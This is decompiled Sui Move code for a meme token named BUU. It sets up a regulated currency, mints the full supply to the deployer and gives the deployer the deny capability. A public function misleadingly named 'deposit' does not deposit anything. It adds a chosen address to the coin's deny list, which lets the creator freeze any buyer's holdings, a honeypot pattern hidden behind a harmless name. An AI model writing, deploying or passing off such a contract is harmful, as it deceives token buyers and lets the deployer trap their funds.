module 0xce01d918cd921b3073fd61ab588b3bb4e85b6e78b41bf0ea36171168563f158e::buu {
    struct BUU has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BUU>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BUU>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: BUU, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/ethereum/0x00adeb0236a7fe3269f33e703690da64ecc30757.png?size=lg&key=37c874                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<BUU>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"BUU     ")))), trim_right(b"BUU                             "), trim_right(b"BUU, the mischievous little devil who loves to shake things up and flip the script, is ever hungry for glory. Now, he's set his sights on SUI, ready to claim the blockchain as his new domain. With unbreakable resolve and a talent for comedic blunders, he's on a mission to create the internet's most legendary meme.     "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BUU>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BUU>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<BUU>>(0x2::coin::mint<BUU>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BUU>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

